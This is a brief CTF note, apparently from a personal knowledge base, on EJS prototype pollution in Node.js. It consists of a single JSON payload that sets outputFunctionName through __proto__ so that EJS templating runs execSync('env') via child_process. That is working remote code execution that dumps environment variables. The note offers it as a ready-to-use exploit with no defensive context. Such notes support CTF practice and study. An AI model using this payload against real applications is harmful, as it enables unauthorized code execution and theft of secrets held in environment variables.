tags:: CTF/JS, CTF/JS/原型链污染, CTF/NodeJS/EJS

- EJS原型链污染
- payload:
	- ```json
	  {"__proto__":{"__proto__":{"outputFunctionName":"__tmp1; return global.process.mainModule.constructor._load('child_process').execSync('env'); __tmp2"}}}
	  ```